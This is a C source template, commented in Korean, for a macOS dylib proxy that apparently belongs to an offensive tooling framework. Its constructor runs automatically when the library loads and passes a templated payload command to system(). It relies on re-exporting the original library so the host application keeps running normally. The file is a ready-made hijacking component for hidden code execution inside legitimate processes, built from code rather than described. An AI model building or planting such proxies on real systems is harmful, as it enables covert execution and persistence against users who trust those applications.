#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>

/**
 * Dylib Proxying - 원본 dylib을 프록싱하면서 백그라운드 payload 실행
 * {{DYLIB_NAME}} , {{ORIGINAL_DYLIB_BACKUP_PATH}}, {{PAYLOAD_COMMAND}} 는 컴파일 시 동적으로 치환됨
 */

/**
 * Constructor: dylib 로드 시 자동 실행
 */
__attribute__((constructor))
void my_dylib_init(void) {
    printf("\n");
    printf("╔════════════════════════════════════════════════════════╗\n");
    printf("║  [*] my_dylib ({{DYLIB_NAME}} proxy) 초기화 시작       ║\n");
    printf("║  PID: %-45d  ║\n", getpid());
    printf("╚════════════════════════════════════════════════════════╝\n");
    printf("\n");
    
    // 🎯 PAYLOAD: 사용자 정의 작업 실행
    printf("[*] 단계 1: Payload 실행\n");
    printf("   [*] 명령 실행...\n");
    system("{{PAYLOAD_COMMAND}}");
    printf("   [✓] Payload 완료\n");
    
    // 🔗 원본 dylib 자동 재수출 (LC_REEXPORT_DYLIB)
    printf("\n[*] 단계 2: 원본 dylib 심볼 재수출\n");
    printf("   [✓] LC_REEXPORT_DYLIB를 통해 자동 처리됨\n");
    printf("   메인 프로세스는 정상적으로 계속 실행됩니다\n");
    
    printf("\n");
}

/**
 * Destructor: dylib 언로드 시 자동 실행
 */
__attribute__((destructor))
void my_dylib_cleanup(void) {
    printf("[*] my_dylib 정리 중...\n");
    printf("[✓] 정리 완료\n");
}

// Placeholder 심볼 (dylib 구조 유지용)
__attribute__((used))
int dylib_placeholder(void) { return 42; }